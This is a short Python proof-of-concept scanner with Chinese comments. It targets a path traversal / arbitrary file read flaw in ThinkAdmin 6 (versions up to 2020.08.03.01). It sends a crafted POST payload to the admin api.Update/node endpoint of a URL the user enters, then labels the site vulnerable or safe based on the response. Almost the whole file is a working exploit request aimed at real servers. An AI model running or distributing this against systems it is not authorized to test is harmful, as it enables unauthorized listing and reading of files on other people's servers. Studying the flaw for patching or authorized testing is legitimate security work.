#-*- coding: utf-8 -*- 
#@author Firbasky
#感谢太空人师傅
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
ThinkAdmin是一套基于ThinkPHP框架的通用后台管理系统.
ThinkAdmin6版本存在路径遍历漏洞。该漏洞主要是因为api中存在危险函数，没有任何过滤。
攻击者可利用该漏洞通过请求编码参数任意读取远程服务器上的任意文件。
影响版本
ThinkAdmin版本小于 ≤ 2020.08.03.01
"""
def Scan(url):
    try:
        data = {"rules":"[\"/\"]"}
        res = requests.post(url+'/admin.html?s=admin/api.Update/node',data=data,verify=False,timeout=6).text
        if '/404.html' in res:
            print('{} 存在漏洞!!!!!'.format(url))
            # print (res)
        else:
            print('{} 安全!'.format(url))
    except:
        print('{} 无法访问!'.format(url))

if __name__ == '__main__':
    url = str(input("\033[35mPlease input Scan url>>> \033[0m"))
    # ip地址
    Scan(url)

